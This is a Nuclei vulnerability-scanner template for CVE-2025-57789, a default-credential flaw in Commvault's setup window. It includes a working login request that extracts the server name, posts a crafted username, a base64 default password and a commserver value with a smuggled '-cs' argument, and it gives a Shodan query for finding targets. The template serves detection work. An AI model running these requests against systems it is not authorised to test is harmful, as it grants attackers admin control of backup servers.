flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: connection
    part: body
    regex:
    - '"activeMQConnectionURL":"tcp:\/\/(.*?):\d+.*"'
    type: regex
  method: GET
  path:
  - '{{BaseURL}}/commandcenter/publicLink.do'
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains_all(body, "userGUID","token")
    type: dsl
  raw:
  - "POST /commandcenter/api/Login HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\n\
    Content-Type: application/json;charset=UTF-8\n\n{\n  \"username\": \"{{connection}}_localadmin__\"\
    ,\n  \"password\": \"YSAtbG9jYWxhZG1pbg==\",\n  \"commserver\": \"{{connection}}\
    \ -cs {{connection}}\"\n}\n"
id: CVE-2025-57789
info:
  author: DhiyaneshDK,watchtowr
  description: 'An issue was discovered in Commvault before 11.36.60.During the brief
    window between installation and the first administrator login, remote attackers
    may exploit the default credential to gain admin control. This is limited to the
    setup phase, before any jobs have been configured.

    '
  impact: 'Attackers can exploit default credentials during the brief setup window
    between installation and first administrator login to gain admin control of the
    Commvault instance.

    '
  metadata:
    max-request: 2
    shodan-query: http.favicon.hash:-542502280
    verified: true
  name: Commvault Initial Administrator Login Process Vulnerability
  reference:
  - https://labs.watchtowr.com/guess-who-would-be-stupid-enough-to-rob-the-same-vault-twice-pre-auth-rce-chains-in-commvault/
  - https://documentation.commvault.com/securityadvisories/CV_2025_08_4.html
  - https://nvd.nist.gov/vuln/detail/CVE-2025-57789
  remediation: 'Complete the initial administrator setup immediately after installation
    and change all default credentials.

    '
  severity: medium
  tags: cve,cve2025,commandcenter,commvault,unauth,vuln
